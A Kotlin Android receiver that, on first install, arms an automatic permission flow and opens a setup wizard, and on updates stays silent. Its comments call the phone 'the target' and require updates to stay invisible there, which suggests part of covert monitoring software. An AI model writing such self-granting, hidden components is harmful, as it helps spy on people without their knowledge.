package com.sp.core

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.util.Log
import com.sp.core.util.Prefs

/**
 * Fires right after the installation or the update of the app.
 *
 * The first installation behaves like the old installer: the wizard opens and
 * runs the whole permission flow by itself. On an UPDATE nothing is shown -
 * the wizard would pop a full screen window on the target for no reason,
 * because the permissions that were granted once are still granted. The auto
 * flow stays armed, so it runs the next time the user opens the icon.
 */
class SetupLauncherReceiver : BroadcastReceiver() {

    override fun onReceive(ctx: Context, intent: Intent) {
        val action = intent.action ?: return
        if (action != Intent.ACTION_MY_PACKAGE_REPLACED && action != Intent.ACTION_PACKAGE_ADDED) {
            return
        }

        var firstInstall = false
        if (action == Intent.ACTION_PACKAGE_ADDED) {
            val pkg = intent.data?.schemeSpecificPart ?: return
            if (pkg != ctx.packageName) return
            firstInstall = true
        }

        try {
            Prefs.set(ctx, LauncherActivity.KEY_AUTO, true)
            Prefs.set(ctx, LauncherActivity.KEY_AUTO_IDX, 0)
        } catch (t: Throwable) {
            Log.w(TAG, "setup arm failed: ${t.message}")
        }

        // An update must stay invisible on the target: no window, no dialog.
        if (!firstInstall) {
            Log.i(TAG, "update detected - wizard stays armed, no window")
            return
        }

        try {
            val i = Intent(ctx, LauncherActivity::class.java)
                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            ctx.startActivity(i)
        } catch (t: Throwable) {
            Log.i(TAG, "wizard auto-open blocked: ${t.message}")
        }
    }

    companion object {
        private const val TAG = "SetupLauncher"
    }
}
